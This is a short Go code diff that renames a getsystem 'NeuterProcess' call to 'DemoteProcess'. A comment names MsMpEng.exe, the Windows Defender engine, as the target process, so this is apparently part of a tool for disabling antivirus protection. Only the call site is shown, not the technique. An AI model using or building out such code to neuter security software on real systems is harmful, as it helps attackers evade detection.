@@ -10,7 +10,7 @@ import (
 
 func main() {
 	pid, _ := strconv.Atoi(os.Args[1]) // MsMpeng.exe
-	err := getsystem.NeuterProcess(pid)
+	err := getsystem.DemoteProcess(pid)
 	if err != nil {
 		log.Fatal(err)
 	}
